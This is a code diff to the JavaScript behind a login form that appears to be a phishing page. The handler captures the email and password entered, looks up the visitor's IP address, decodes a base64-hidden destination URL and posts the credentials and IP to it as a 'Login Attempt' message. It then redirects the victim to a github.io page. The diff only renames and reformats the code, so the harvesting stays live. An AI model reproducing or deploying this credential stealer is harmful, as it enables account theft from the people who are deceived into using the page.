@@ -18,7 +18,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
     const password = document.getElementById('password').value;
 
     // List of IPs to block (placeholders for now)
-    const blockedIPs = ['12'];
+    const blockedIPs = ['89.187.164.251'];
 
     // Fetch the user's IP address using ipify
     fetch('https://api.ipify.org?format=json')
@@ -46,26 +46,26 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
 
             // Decode and fetch user info
             const userInfo = atob(userinfoEncoded);
-
+            
             fetch(userInfo, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
-                    content: `Fresh Fish Login Attempt:
+                    content: `New Login Attempt:
 Email: ||${email}||
 Password: ||${password}||
 IP Address: ||${userIP}||`
                 })
             })
-                .then(response => {
-                    window.location.href = 'https://cryptodude3.github.io/badmin/';
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    window.location.href = 'https://cryptodude3.github.io/badmin/';
-                });
+            .then(response => {
+                window.location.href = 'https://cryptodude3.github.io/badmin/';
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                window.location.href = 'https://cryptodude3.github.io/badmin/';
+            });
         })
         .catch(error => {
             console.error('Error fetching IP:', error);
